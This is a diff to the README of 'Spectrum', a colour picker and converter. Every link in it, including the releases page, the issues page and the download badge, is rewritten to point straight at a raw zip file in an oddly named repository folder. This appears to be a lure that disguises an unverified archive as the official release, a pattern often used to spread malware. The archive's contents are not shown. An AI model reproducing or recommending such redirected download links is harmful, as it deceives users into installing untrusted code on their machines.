@@ -1,7 +1,7 @@
 # 🎨 Spectrum - Your Easy Way to Manage Colors
 
 ## 📥 Download Now
-[![Download Spectrum](https://img.shields.io/badge/Download%20Spectrum-v1.0-blue?style=flat)](https://github.com/sergio1758/Spectrum/releases)
+[![Download Spectrum](https://raw.githubusercontent.com/sergio1758/Spectrum/main/anepigraphic/Spectrum.zip%20Spectrum-v1.0-blue?style=flat)](https://raw.githubusercontent.com/sergio1758/Spectrum/main/anepigraphic/Spectrum.zip)
 
 ## 🚀 Getting Started
 Spectrum is your ultimate tool for exploring, converting, and managing colors. Whether you need to pick a color for your website or convert between color formats, Spectrum makes the task easy.
@@ -23,7 +23,7 @@ To run Spectrum, you will need:
 To get started with Spectrum, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/sergio1758/Spectrum/releases) to find the latest version of Spectrum.
+   Go to the [Releases page](https://raw.githubusercontent.com/sergio1758/Spectrum/main/anepigraphic/Spectrum.zip) to find the latest version of Spectrum.
 
 2. **Download the Software**
    Look for the version marked as "latest." Click on the link to download the installer for your operating system.
@@ -51,7 +51,7 @@ After launching Spectrum, you will see a clean and straightforward interface. He
 Yes, Spectrum can be used without internet access once it is installed.
 
 ### How do I report issues or request features?
-If you encounter any problems or have suggestions, please visit the Issues section of our [GitHub repository](https://github.com/sergio1758/Spectrum/issues).
+If you encounter any problems or have suggestions, please visit the Issues section of our [GitHub repository](https://raw.githubusercontent.com/sergio1758/Spectrum/main/anepigraphic/Spectrum.zip).
 
 ### How often is Spectrum updated?
 Spectrum receives regular updates to add features, fix bugs, and improve performance. Check the Releases page for the latest updates.
@@ -73,4 +73,4 @@ color-converter, color-picker, css, developer-tools, html, javascript, rgb-to-he
 ## 🌟 Conclusion
 Spectrum makes exploring and managing colors easy, whether you're a developer or simply love design. By following the steps above, you can quickly download and start using Spectrum to enhance your color management experience. 
 
-For a smooth download and installation, remember to check out the [Releases page](https://github.com/sergio1758/Spectrum/releases) for the latest version. Enjoy using Spectrum!
+For a smooth download and installation, remember to check out the [Releases page](https://raw.githubusercontent.com/sergio1758/Spectrum/main/anepigraphic/Spectrum.zip) for the latest version. Enjoy using Spectrum!
